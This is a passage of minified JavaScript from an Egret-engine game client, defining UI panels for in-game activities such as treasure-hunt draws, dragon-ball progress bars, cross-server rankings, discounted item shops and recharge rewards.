t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];Timer.stop(this.timeClock,this)},e.prototype.updateGetLongZhu=function(){var t=l.GlobalConfig.ActivityType18Config[this.activityID][0],e=t.relateActivityId,i=l.GlobalConfig.ActivityType13Config[e];for(var n in i)this.updateLongZhu(i[n].index)},e.prototype.updateData2=function(t){void 0===t&&(t=!1);var e=l.GlobalConfig.ActivityType18Config[this.activityID][0];if(t){var i=e.relateActivityId,n=l.GlobalConfig.ActivityType13Config[i];for(var o in n)this.updateLongZhu(n[o].index)}null==this.rewardList.dataProvider?this.rewardList.dataProvider=new eui.ArrayCollection(e.showDrop.concat()):this.rewardList.dataProvider.replaceAll(e.showDrop.concat()),this.rewardList.validateNow();for(var s=0;s<this.rewardList.numElements;s++){this.rewardList.getVirtualElementAt(s)}},e.prototype.RewardResult=function(t){t&&this.activityID!=t.activityID||this.updateMaterial()},e.prototype.callbackPlayEff=function(){var t=c.Activity.ins().getActivityDataById(this.activityID);if(t){var e=l.GlobalConfig.ActivityType18Config[this.activityID][0].relateActivityId,i=c.Activity.ins().getActivityDataById(e);if(i){var n=void 0;n=this.sendBuyType?this.buy10.localToGlobal():this.buy1.localToGlobal(),this.globalToLocal(n.x,n.y,n);for(var o=(n.x,n.y,0);o<i.playList.length;o++){var s=i.playList[o];this["ball"+s]&&(n=this["ball"+s].localToGlobal(),this.globalToLocal(n.x,n.y,n),this.updateLongZhu(s,!0))}i.playList=[]}}},e.prototype.listRefush=function(){c.Activity.ins().getActivityDataById(this.activityID)},e.prototype.onBuy=function(t){switch(t.target){case this.buy1:this.buyHunt(1),this.sendBuyType=0;break;case this.buy10:this.buyHunt(2),this.sendBuyType=1;break;case this.lb_GaiLv:var e=[[1],[2]];win.open(f.XunBaoGaiLv,e[0].join("\n"),e[1].join("\n"));default:var i=c.Activity.ins().getActivityDataById(this.activityID);if(!i)return;var n=l.GlobalConfig.ActivityType18Config[this.activityID][0].relateActivityId,s=l.GlobalConfig.ActivityType13Config[n];if(t.currentTarget==this.getItemTxt)return void win.open(g.OSATarget18Panel2Tips,n);for(var a=o.CommonUtils.getObjectLength(s),r=0;a>r&&this["ball"+(r+1)];r++)if(this["ball"+(r+1)]==t.currentTarget){var h=c.Activity.ins().getActivityDataById(n),u=h.proCount[r+1]/s[r+1].count;1==u&&0==h.awardCount[r+1]&&c.Activity.ins().sendReward(n,r+1);break}}},e.prototype.buyHunt=function(t){if(u.BagCT.ins().getAllSurplusCount(1)<0)return void p.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));this.huntType=t;var e=l.GlobalConfig.ActivityType18Config[this.activityID],i=u.BagCT.ins().getBagGoodsByTypeAndId(u.BagCT.BAG_TYPE_OTHTER,e[t].item);if(i&&i.count)c.Activity.ins().sendReward(this.activityID,t);else{var n=t>1?10:1,o=e[t].yb;d.HuntWarnBuyWin.showBuyWarn("OSATarget18Panel2-HuntResultWin"+(10==n?1:0),this.huntWarnFun.bind(this),gettext("是否消耗{0}元宝购买{1}*{2}",o,l.GlobalConfig.ItemConfig[e[t].item].name,n))}},e.prototype.huntWarnFun=function(){var t=l.GlobalConfig.ActivityType18Config[this.activityID],e=u.BagCT.ins().getBagGoodsByTypeAndId(u.BagCT.BAG_TYPE_OTHTER,t[this.huntType].item);if(e&&e.count)c.Activity.ins().sendReward(this.activityID,this.huntType);else{var i=l.GlobalConfig.ActivityType18Config[this.activityID][this.huntType].yb;h.ActorCC.yb>=i?c.Activity.ins().sendReward(this.activityID,this.huntType):p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|"))}},e.prototype.updateMaterial=function(){var t=l.GlobalConfig.ActivityConfig[this.activityID];this.actInfo1.text=t.desc;var e=u.BagCT.ins().getBagGoodsByTypeAndId(0,l.GlobalConfig.ActivityType18Config[this.activityID][1].item),i=e?e.count:0;this.num1.textFlow=s.TextFlowMaker.generateTextFlow1("|C:"+(i?n.ColorUtil.GREEN_COLOR_N:n.ColorUtil.RED_COLOR_N)+"&T:"+i+"|"),this.num10.textFlow=s.TextFlowMaker.generateTextFlow1("|C:"+(i>=10?n.ColorUtil.GREEN_COLOR_N:n.ColorUtil.RED_COLOR_N)+"&T:"+i+"|");var o=l.GlobalConfig.ActivityType18Config[this.activityID];this.icon1.source=""+RES_DIR_ITEMICON+l.GlobalConfig.ItemConfig[o[1].item].icon+".png",this.icon10.source=""+RES_DIR_ITEMICON+l.GlobalConfig.ItemConfig[o[2].item].icon+".png",this.getItemTxt.textFlow=s.TextFlowMaker.generateTextFlow1("|U:&T:"+this.getItemTxt.text)},e.prototype.updateLongZhu=function(t,e){void 0===e&&(e=!1);var i=this["ball"+t];if(i){i.setImgIndex(t);var n=c.Activity.ins().getActivityDataById(this.activityID);if(n){var o=l.GlobalConfig.ActivityType18Config[this.activityID][0].relateActivityId,s=c.Activity.ins().getActivityDataById(o);s&&(e?i.play(s.awardCount[t],s.proCount[t]):i.data={times:s.awardCount[t],count:s.proCount[t],maxcount:l.GlobalConfig.ActivityType13Config[o][t].count})}}},e.prototype.timeClock=function(){var t=c.Activity.ins().getActivityDataById(this.activityID);t&&(this.endedTime=t.getLeftTime(),this.actTime1.text=this.endedTime)},e.prototype.updateData=function(){this.updateMaterial()},e}(a.BaseView);window.OSATarget18Panel2=m,__reflect(m.prototype,"OSATarget18Panel2",[]),window.OSATarget18Panel2=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.XunBaoGaiLv=void 0;var n=i(1),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="XunBaoGaiLvSkin",e}return __extends(e,t),e.prototype.initData=function(){this.addTouchEvent(this.bgClose,this.onTap)},e.prototype.open=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.lb_name.textFlow=HtmlUtil.parse(t[0]),this.lb_percent.textFlow=HtmlUtil.parse(t[1])},e.prototype.onTap=function(t){switch(t.currentTarget){case this.bgClose:win.close(e)}},e}(n.BaseView);e.XunBaoGaiLv=o,window.XunBaoGaiLv=o,__reflect(o.prototype,"XunBaoGaiLv",[]),window.XunBaoGaiLv=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget18Panel2Item=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e.imgIndex=0,e._sn_="dragonBallSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.setImgIndex=function(t){this.imgIndex=t,this.skin&&(this.liang.visible=!0,this.an.source="dragonball_an_"+t,this.liang.source="dragonball_liang_"+t)},e.prototype.dataChanged=function(){if(t.prototype.dataChanged.call(this),this.setImgIndex(this.imgIndex),this.data){var e=this.data.times;this.get.visible=e>0,this.percent.visible=!this.get.visible;var i=this.data.count/this.data.maxcount;this.eRed.visible=1==i&&0==e,this.percent.text=(100*i>>0)+"%",this.liang.scrollRect?this.liang.scrollRect.y=this.liang.height-this.liang.height*i:(this.liang.scrollRect=new egret.Rectangle(0,this.height-this.height*i,this.liang.width,this.liang.height),this.liang.scrollRect.y=this.height-this.height*i,this.liang.scrollRect.width=this.liang.scrollRect.height=this.height),this.liang.y=this.liang.scrollRect.y}},e.prototype.play=function(t,e,i){var n=this;if(this.data)if(this.data.count<=e){var o=e/this.data.maxcount;this.percent.text=(100*o>>0)+"%";var s=this.liang.height-this.liang.height*o,a=egret.Tween.get(this.liang.scrollRect,{onChange:function(){n.liang.y=n.liang.scrollRect.y}}).to({y:s},500).call(function(){n.data.count=isNaN(i)?e:0,egret.Tween.removeTweens(a),isNaN(i)||(n.liang.y=n.liang.scrollRect.y=n.liang.height,n.play(n.data.times,i))});this.get.visible=t>0,this.percent.visible=!this.get.visible,this.eRed.visible=1==o&&0==t}else{this.play(this.data.times,this.data.maxcount,e),this.get.visible=this.data.times>0,this.percent.visible=!this.get.visible;var o=e/this.data.maxcount;this.eRed.visible=1==o&&0==this.data.times}},e}(n.BaseItemRender);e.OSATarget18Panel2Item=o,window.OSATarget18Panel2Item=o,__reflect(o.prototype,"OSATarget18Panel2Item",[]),window.OSATarget18Panel2Item=o},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfRankItemRender=e.OSATarget19Panel1ItemRender=e.OSATarget19Panel1=void 0;var n=i(3),o=i(1),s=i(0),a=i(4),r=i(44),l=i(346),h=i(9),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa19p1skin",e._the3Items=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.list0.itemRenderer=p,this.list0.dataProvider=this.rankDatas=new eui.ArrayCollection,this._the3Items=[];for(var t=1;this["role"+t];)this._the3Items.push(this["role"+t]),this["role"+t].idx=t+1,t++},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];s.GlobalConfig.ActivityType19Config[this.activityID][1];this.ins=h.Activity.ins(),observe(this,this.upData,h.Activity.ins().postKuaFuRank),this.addTouchEvent(this,this.onClick),h.Activity.ins().sendKuaFuRank(this.activityID)},e.prototype.upData=function(){var t=0,e=this.ins.getActivityDataById(this.activityID),i=e.GetRankList();if(0!=i.length){for(var n=0,o=this._the3Items.length;o>n;n++)n<i.length?this._the3Items[n]&&(this._the3Items[n].data=i[n]):this._the3Items[n]&&(this._the3Items[n].data=null);var s=[];for(var n in i){i[n].rank>3&&s.push(i[n]);var r=i[n];r&&a.ActorCC.actorID==r.actorId&&(t=r.rank)}this.selfPos.text=t?t+"":gettext("未上榜"),this.rankDatas.replaceAll(s),Timer.start(1e3,0,this.setTime,this),this.setTime()}else{this.rankDatas.source=[],this.rankDatas.refresh();for(var l=0,h=this._the3Items;l<h.length;l++){var u=h[l];u.data=null}}},e.prototype.onClick=function(t){switch(t.target){case this.btnReward:win.open("osa19p1rewardPanel",this.activityID)}},e.prototype.updateData=function(){},e.prototype.setTime=function(){var t=this.ins.getActivityDataById(this.activityID);t&&(this.actTime.text=t.getRemainTime())},e}(o.BaseView);e.OSATarget19Panel1=u,window.OSATarget19Panel1=u,__reflect(u.prototype,"OSATarget19Panel1",[]);var p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.laterTime=100,e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchChildren=!1},e.prototype.dataChanged=function(){var e=this;t.prototype.dataChanged.call(this),setTimeout(function(){e.data instanceof l.KuaFuRankData&&(e.data.rank<=3?e.rankTxt.visible=!1:(e.rankTxt.text=e.data.rank+"",e.rankTxt.visible=!0),e.player.text=""+e.data.roleName,e.target.text=gettext("已寻宝：")+e.data.rmb),e.laterTime=0},this.laterTime)},e}(n.BaseItemRender);e.OSATarget19Panel1ItemRender=p,window.OSATarget19Panel1ItemRender=p,__reflect(p.prototype,"OSATarget19Panel1ItemRender",[]);var d=function(t){function e(){var e=t.call(this)||this;return e._sn_="KfRoleItem",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this),this.rankImg.visible=!0,this.invite.visible=this.position.visible=!1},e.prototype.onTouch=function(t){this._info&&r.ReadPlayerCT.ins().sendFindPlayer(this._info.actorId,this._info.serverId)},Object.defineProperty(e.prototype,"idx",{set:function(t){this._idx=t},enumerable:!1,configurable:!0}),e.prototype.dataChanged=function(){this._info=this.data,this._info?(this.lab.visible=this.nomember.visible=!1,this.rolegroup.visible=!0,this.txtName.text=this._info.roleName,this.role.source="Role_zy"+this._info.job,this.rankImg.source="paihang_d"+this._info.rank,this.imgJob.source="yuanhead"+this._info.job+"1",this.pow.text=this._info.rmb+""):(this.nomember.visible=this.lab.visible=!0,this.rolegroup.visible=!1,this.rankImg.source="paihang_d"+this._idx)},e.prototype.destruct=function(){this.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this)},e}(n.BaseItemRender);e.KfRankItemRender=d,window.KfRankItemRender=d,__reflect(d.prototype,"KfRankItemRender",[]),window.KfRankItemRender=d,window.OSATarget19Panel1=u,window.OSATarget19Panel1ItemRender=p},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget1Panel=void 0;var n=i(29),o=i(9),s=i(2),a=i(555),r=i(0),l=i(24),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa1pskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listDP=new eui.ArrayCollection,this.eList.dataProvider=this.listDP,this.eList.itemRenderer=a.OSATarget1Item},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.ins=o.Activity.ins(),this.cfg=r.GlobalConfig.ActivityType1Config[this.activityID],this.ins.sendChangePage(this.activityID),observe(this,this.GetCallBack,this.ins.postRewardResult),observe(this,this.changePage,this.ins.postChangePage),this.addTouchEvent(this,this.onClick)},e.prototype.GetCallBack=function(t){var e=t.activityID,i=t.isSuccee;this.activityID==e&&(i||(s.TipsCT.ins().showTips(gettext("领取失败")),this.ins.sendChangePage(this.actData.id)),this.updateData())},e.prototype.onClick=function(t){if(t.target instanceof eui.Button&&t.target.parent.parent instanceof a.OSATarget1Item)return void t.target.parent.parent.onClick();var e=this.cfg[1];switch(t.target){case this.eGetLab:e.turn&&e.turn.length>0&&win.open(e.turn[0],e.turn.slice(1));break;case this.eGift:e.rewardTurn&&e.rewardTurn.length>0&&win.open(e.rewardTurn[0],e.rewardTurn.slice(1))}},e.prototype.changePage=function(t){this.activityID==t&&this.updateData()},e.prototype.updateData=function(){this.actData=this.ins.getActivityDataById(this.activityID),this.updateView(),this.updateList()},e.prototype.updateView=function(){var t=this.cfg[1];this.eIcon.data=t.extra,this.eItemName.text=r.GlobalConfig.ItemConfig[t.extra.id].name,this.eGetTips.text=t.extraTip||"",this.eGetLab.visible=t.turn&&t.turn.length>0,this.eGetLab.textFlow=(new egret.HtmlTextParser).parser(gettext("<a href=>{0}<u>我要提升{1}</u></a>","event:",t.tarName))},e.prototype.updateList=function(){for(var t=l.CommonUtils.objectToArray(this.cfg),e=[],i=[],n=0;n<t.length;n++){var s=this.actData.getRewardStateById(t[n].index);s==o.Activity.Geted?i.push(t[n]):e.push(t[n])}t=e.concat(i),this.listDP.replaceAll(t)},e}(n.ActivityPanel);e.OSATarget1Panel=h,window.OSATarget1Panel=h,__reflect(h.prototype,"OSATarget1Panel",[]),window.OSATarget1Panel=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget2Panel1=void 0;var n=i(0),o=i(29),s=i(9),a=i(556),r=i(2),l=i(24),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa2p1skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addChangeEvent(this.eTab,this.onTabTouch),this.addChangingEvent(this.eTab,this.onTabTouching),this.addTouchEvent(this,this.onClick),this.listDP=new eui.ArrayCollection,this.eList.itemRenderer=a.OSATarget2Panel1Item,this.eList.dataProvider=this.listDP},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.GetCallBack,s.Activity.ins().postRewardResult),this.updateData()},e.prototype.updateData=function(){var t,e=n.GlobalConfig.ActivityBtnConfig,i=n.GlobalConfig.ActivityType2Config[this.activityID],o=(null===(t=i[1].activityID)||void 0===t?void 0:t.slice(0))||[];o.unshift(this.activityID);var s=[];for(var a in o){var r=o[a];s.push({actId:r,name:e[r].icon,icon:""})}this.eTab.dataProvider=new eui.ArrayCollection(s),this.eTab.selectedIndex=0,this.updateList()},e.prototype.onTabTouch=function(t){this.updateList()},e.prototype.onTabTouching=function(t){return this.checkIsOpen(this.eTab.selectedIndex)?void 0:(t.preventDefault(),void r.TipsCT.ins().showTips(gettext("第{0}天开放",this.eTab.selectedIndex+1)))},e.prototype.checkIsOpen=function(t){var e=this.eTab.selectedItem.actId,i=s.Activity.ins().getActivityDataById(e);return i&&i.isOpenActivity()&&!i.isHide},e.prototype.updateList=function(){var t=this.eTab.selectedItem.actId;this.listDP.source=l.CommonUtils.objectToArray(n.GlobalConfig.ActivityType2Config[t])},e.prototype.GetCallBack=function(t){var e=t.activityID;t.isSuccee;this.activityID==e&&this.updateData()},e.prototype.onClick=function(t){return t.target instanceof eui.Button&&t.target.parent.parent instanceof a.OSATarget2Panel1Item?void t.target.parent.parent.onClick():void 0},__decorate([delayCall(100)],e.prototype,"updateData",null),__decorate([delayCall()],e.prototype,"updateList",null),e}(o.ActivityPanel);e.OSATarget2Panel1=h,window.OSATarget2Panel1=h,__reflect(h.prototype,"OSATarget2Panel1",[]),window.OSATarget2Panel1=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget2Panel2=void 0;var n=i(0),o=i(4),s=i(2),a=i(202),r=i(9),l=i(557),h=i(29),u=i(5),p=i(30),d=function(t){function e(){var e=t.call(this)||this;return e._index=0,e._sn_="osa2p2skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listDP=new eui.ArrayCollection,this.eList.dataProvider=this.listDP,this.eList.itemRenderer=l.OSATarget2Penel2Item},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTap),this.eList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onTouch,this),observe(this,this.GetCallBack,r.Activity.ins().postRewardResult);var i=this.getRule();this.eList.selectedIndex=i-1,this.updateData(i)},e.prototype.GetCallBack=function(t){var e=t.activityID,i=t.isSuccee;if(this.activityID==e){if(!i)return void s.TipsCT.ins().showTips(gettext("领取失败"));var n=this.getRule();this.eList.selectedIndex=n-1,this.updateData(n)}},e.prototype.onTouch=function(){var t=this.eList.selectedIndex;this.updateData(t+1)},e.prototype.onTap=function(t){switch(t.target){case this.buy:if(o.ActorCC.getCurrencyByType(this.config.currencyType)<this.config.price)return void s.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:{0}不足|",p.RewardData.getCurrencyName(this.config.currencyType)));r.Activity.ins().sendReward(this.activityID,this.config.index)}},e.prototype.getRule=function(){var t=r.Activity.ins().getActivityDataById(this.activityID),e=n.GlobalConfig.ActivityType2Config[this.activityID],i=[];for(var o in e)i.push(e[o]);i.sort(this.sortFunc);for(var s=0;s<i.length;s++){var a=i[s],l=t.buyData[a.index]>=a.count;if(!l)return a.index}return 2},e.prototype.sortFunc=function(t,e){return t.price<e.price?-1:t.price>e.price?1:0},e.prototype.updateData=function(t){if(t){t>=0&&(this._index=t);
var e=r.Activity.ins().getActivityDataById(this.activityID),i=n.GlobalConfig.ActivityType2Config[this.activityID];this.config=i[this._index],this.eDesc.textFlow=u.TextFlowMaker.generateTextFlow(gettext("花费<font color = '#FFcf0e'>{0}</font>元宝即可获得<font color = '#FF964C'>{1}</font>",this.config.price,this.config.giftName)),this.eItemList.dataProvider=new eui.ArrayCollection(this.config.rewards);var s=e.buyData[this.eList.selectedIndex+1]>=this.config.count;this.buy.visible=!s,this.already.visible=s,this.actTime.visible=!this.already.visible,this.showbg.source=this.config.source[2],this.buy.sRp=this.buy.visible&&o.ActorCC.yb>=this.config.price&&o.ActorCC.level>=a.ActivityType2Data.LimitLevel;var l=[];for(var h in i)l.push(i[h].source.concat());this.listDP.replaceAll(l)}},e}(h.ActivityPanel);e.OSATarget2Panel2=d,window.OSATarget2Panel2=d,__reflect(d.prototype,"OSATarget2Panel2",[]),window.OSATarget2Panel2=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget2Item3=e.OSATarget2Panel3=void 0;var n=i(3),o=i(11),s=i(0),a=i(4),r=i(6),l=i(2),h=i(9),u=i(30),p=i(202),d=i(29),c=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa2p3skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=f,this._listArr=new eui.ArrayCollection,this.eList.dataProvider=this._listArr,this._rewardArr=new eui.ArrayCollection,this.list.itemRenderer=o.ItemBase,this.list.dataProvider=this._rewardArr,this.addChangingEvent(this.eList,this.changing),this.addChangeEvent(this.eList,this.itemTap),this.addEvent(eui.ItemTapEvent.ITEM_TAP,this.eList,this.itemTap),this.addEvent(egret.TouchEvent.TOUCH_TAP,this.eBtn,this.onClickHandler)},e.prototype.changing=function(t){console.log(".......aaaa",this.eList.selectedIndex),this._actData=h.Activity.ins().getActivityDataById(this.activityID),this._actData.checkCanSel(this._cfgArr[this.eList.selectedIndex].index)||t.preventDefault()},e.prototype.itemTap=function(t){this._actData=h.Activity.ins().getActivityDataById(this.activityID),this._actData.checkCanSel(this._cfgArr[this.eList.selectedIndex].index)&&this.flusSelType()},e.prototype.onClickHandler=function(t){if(this._selCfg&&(this._actData=h.Activity.ins().getActivityDataById(this.activityID),this._actData.checkCanBuy(this._selCfg.index,!0).canBuy)){if(a.ActorCC.getCurrencyByType(this._selCfg.currencyType)<this._selCfg.price)return void l.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:{0}不足|",u.RewardData.getCurrencyName(this._selCfg.currencyType)));var e=r.BagCT.ins().rockonNeedNum(this._selCfg.rewards);return e&&r.BagCT.ins().getAllSurplusCount(e)<0?void l.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void h.Activity.ins().sendReward(this.activityID,this._selCfg.index)}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(p.ActivityType2Data.postRewardSuatus,this.flusSelType),this._actData=h.Activity.ins().getActivityDataById(this.activityID),this._cfgArr=[];for(var i in s.GlobalConfig.ActivityType2Config[this.activityID])this._cfgArr.push(s.GlobalConfig.ActivityType2Config[this.activityID][i]);this._listArr.replaceAll(this._cfgArr),this.eList.selectedIndex=this.getDefaultSelIndex(),this.flusSelType()},e.prototype.getDefaultSelIndex=function(){if(this._actData=h.Activity.ins().getActivityDataById(this.activityID),!this._cfgArr)return 0;for(var t=0,e=0,i=this._cfgArr.length;i>e;e++){var n=this._cfgArr[e];if(!this._actData.checkCanSel(n.index)){t=e;break}}return t==this._cfgArr.length||0==t?0:t-1},e.prototype.flusSelType=function(){var t=this.eList.selectedIndex||0;this._selCfg=this._cfgArr[t],this._rewardArr.replaceAll(this._selCfg.rewards.concat([])),this.txtOldCost.text=this._selCfg.originalPrice+"",this.txtCurCost.text=this._selCfg.price+"";var e=getLangType();e==LanguageEnum.CN||e==LanguageEnum.CN1?this.txtDisCount.text=gettext("{0}折",this._selCfg.discount):this.txtDisCount.text=gettext("{0}折",10*(10-this._selCfg.discount)),this.txtTimes.text=gettext("{0}次",this._selCfg.count-this._actData.getBuyCntByIndex(this._selCfg.index)||0),this._actData=h.Activity.ins().getActivityDataById(this.activityID);var i=this._actData.checkCanBuy(this._selCfg.index,!1);i&&!i.canBuy&&1==i.errCode?(this.eBtn.label=gettext("已买完"),this.eBtn.enabled=!1):(this.eBtn.label=gettext("购买"),this.eBtn.enabled=!0)},e.prototype.removeDisplay=function(){},e}(d.ActivityPanel);e.OSATarget2Panel3=c,window.OSATarget2Panel3=c,__reflect(c.prototype,"OSATarget2Panel3",[]);var f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa2p3itemskin",e}return __extends(e,t),e.prototype.createChildren=function(){},e.prototype.dataChanged=function(){if(this._cfg=this.data,this._cfg){var t=getLangType();if(t==LanguageEnum.CN||t==LanguageEnum.CN1)this.ePow.text=this._cfg.discount?this._cfg.discount.toString().replace(".","_"):"0";else{var e=10*(10-this._cfg.discount);this.ePow.text=this._cfg.discount?e.toString().replace(".","_"):"0"}}},e}(n.BaseItemRender);e.OSATarget2Item3=f,window.OSATarget2Item3=f,__reflect(f.prototype,"OSATarget2Item3",[]),window.OSATarget2Item3=f,window.OSATarget2Panel3=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget2Panel6=void 0;var n=i(0),o=i(29),s=i(9),a=i(558),r=i(161),l=i(13),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa2p6skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=a.OSATarget2Panel6Item,this.eList.dataProvider=this.listDP=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,s.Activity.ins().postRewardResult),this.update()},e.prototype.update=function(){var t=n.GlobalConfig.ActivityType2Config[this.activityID],e=[];for(var i in t){var o=r.Dress.ins().getIdZhuangBanId(t[i].rewards[0].id);e.push([t[i],o]);n.GlobalConfig.ZhuangBanId[o],l.SubRoles.ins().roles[0].sex}this.listDP.replaceAll(e)},e}(o.ActivityPanel);e.OSATarget2Panel6=h,window.OSATarget2Panel6=h,__reflect(h.prototype,"OSATarget2Panel6",[]),window.OSATarget2Panel6=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget2Panel7=void 0;var n=i(0),o=i(29),s=i(9),a=i(24),r=i(559),l=i(4),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa2p7skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=r.OSATarget2Panel7Item,this.eList.dataProvider=this.listDP=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,s.Activity.ins().postRewardResult,l.ActorCC.postLevelChange),this.update(),this.eG.removeChildren();var i=n.GlobalConfig.ActivityConfig[this.activityID];for(var o in i.source2){var a=new eui.Image;a.source=i.source2[o],this.eG.addChild(a)}},e.prototype.update=function(){this.listDP.replaceAll(a.CommonUtils.objectToArray(n.GlobalConfig.ActivityType2Config[this.activityID]))},e}(o.ActivityPanel);e.OSATarget2Panel7=h,window.OSATarget2Panel7=h,__reflect(h.prototype,"OSATarget2Panel7",[]),window.OSATarget2Panel7=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var n=i(8),o=i(16),s=i(5),a=i(3),r=i(1),l=i(11),h=i(0),u=i(2),p=i(9),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.selectRes=["sd_projecttitle2","sd_projecttitle1"],e.pageRedPoint=[!1,!1,!1],e}return __extends(e,t),e.prototype.skinComplete=function(){this.initConf(),this.config.pageSkin?this.skinName=this.config.pageSkin:this.skinName="KMHRechargeSkin"},e.prototype.initConf=function(){this.ins=p.Activity.ins(),this.cfg=h.GlobalConfig.ActivityType3Config[this.activityID],this.config=h.GlobalConfig.ActivityConfig[this.activityID]},e.prototype.close=function(){Timer.stopAll(this)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(this.ins.postRewardResult,this.updateDataCall),this.observe(this.ins.postChangePage,this.updateDataCall);for(var i=0;3>i;i++)this["projectbg"+i].name=i.toString(),this.addTouchEvent(this["projectbg"+i],this.onTap);this.rechargeitem.itemRenderer=c,this.rechargeitemData=new eui.ArrayCollection,this.rechargeitem.dataProvider=this.rechargeitemData,this.initData(),Timer.start(1e3,0,this.updateTime,this)},e.prototype.updateTime=function(){var t=this.ins.getActivityDataById(this.activityID);if(t){var e=t.getLeftTime();this.actTime.text=n.DateUtils.getFormatBySecond(e,n.DateUtils.TIME_FORMAT_5,3)}},e.prototype.updatePageRedPoint=function(t){for(var e=0;e<t.length;e++)if(t[e].redPoint)return!0;return!1},e.prototype.updateList=function(t){var e=h.GlobalConfig.ActivityType3Config[t],i=this.ins.getActivityDataById(t),n=[],o=0;for(var s in e){var a=new f;a.id=e[s].Id,a.actType=this.activityType,a.index=e[s].index,a.type=e[s].type,a.day=e[s].day,a.reward=e[s].rewards,a.already=(i.recrod||0)>>e[s].index&1?!0:!1,3==a.type?(a.unready=i.isOverTimer(e[s].index),i.curOpenDay()+1==e[s].day?a.redPoint=i.chongzhiNum>=e[s].val?!0:!1:a.redPoint=!1):1==a.type&&(a.unready=i.dabiao[e[s].index-1]<e[s].day,a.redPoint=!a.already&&!a.unready),a.unready?a.already=a.redPoint=!1:a.redPoint=a.already?!1:a.redPoint,n.push(a),o++}return n},e.prototype.onTap=function(t){for(var e=0;3>e;e++)if(this["projectbg"+e].source=this.selectRes[0],t.currentTarget==this["projectbg"+e]){this.actIndex=e,this["projectbg"+e].source=this.selectRes[1];var i=this.actIds[this.actIndex],n=this.updateList(i);this.rechargeitemData.replaceAll(n)}},e.prototype.initData=function(){if(this.actDesc.text=this.config.desc,this.actIds=[],this.actIds.push(this.activityID),this.cfg[1]&&this.cfg[1].activityID){for(var t=1;t<=this.cfg[1].activityID.length;t++)this.actIds.push(this.cfg[1].activityID[t-1]);this.actIndex=this.getRuleIndex(),this.updateTime(),this.updateData1();var e=h.GlobalConfig.ActivityBtnConfig[this.activityID];e&&(this.title.source=e.title)}},e.prototype.getRuleIndex=function(){var t=0;return t},e.prototype.updateDataCall=function(t){-1!=this.actIds.indexOf(t)&&this.updateData1()},e.prototype.updateData1=function(){for(var t=0;3>t;t++)this["projectbg"+t].source=this.selectRes[0];this["projectbg"+this.actIndex].source=this.selectRes[1];for(var t=0;t<this.actIds.length;t++){var e=this.actIds[t],i=this.updateList(e);this["redpoint"+t].visible=this.updatePageRedPoint(i),t==this.actIndex&&this.rechargeitemData.replaceAll(i);var n=h.GlobalConfig.ActivityType3Config[e];this["price"+t].text=gettext("充值{0}元宝",n[1].val)}if(this.actIds.length<3){var n=h.GlobalConfig.ActivityType3Config[this.actIds[0]];this.price1.text=gettext("充值{0}元宝",n[2].val),this.price2.text=gettext("充值{0}元宝",n[3].val)}var 